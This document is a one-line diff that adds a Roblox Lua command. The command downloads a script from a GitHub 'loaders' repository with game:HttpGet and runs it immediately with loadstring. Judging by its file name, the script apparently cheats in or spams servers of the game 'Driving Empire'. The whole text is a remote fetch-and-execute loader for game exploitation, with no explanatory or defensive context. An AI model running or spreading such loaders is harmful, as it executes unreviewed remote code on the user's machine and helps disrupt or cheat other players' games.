@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/driving-empire-rp-servers-spam5-qxgr711tgz17st.lua"))()
